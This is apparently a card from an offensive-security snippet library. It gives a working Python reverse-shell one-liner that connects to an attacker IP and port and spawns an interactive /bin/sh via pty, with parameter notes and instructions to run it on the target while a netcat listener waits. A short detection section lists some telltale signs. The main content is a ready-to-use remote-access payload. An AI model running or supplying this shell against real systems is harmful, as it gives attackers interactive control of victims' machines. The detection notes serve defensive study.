---
id: a3b4fa19-8dca-4434-80b3-c88c9be2197e
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - pty
validated: true
---

# Python-Basic-Reverse-Shell-PTY

## Code

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## Description

This basic one-liner creates a TCP socket connection to the attacker and spawns an interactive /bin/sh shell using pty, redirecting I/O streams for full shell functionality.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

Execute directly on the target machine after replacing IP/port. Pair with a netcat listener on attacker. Ideal for quick shell in Linux environments.

## Detection

- Direct imports of socket/os/pty in Python one-liners.
- Outbound TCP to unusual ports.
- Spawned /bin/sh processes tied to Python.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
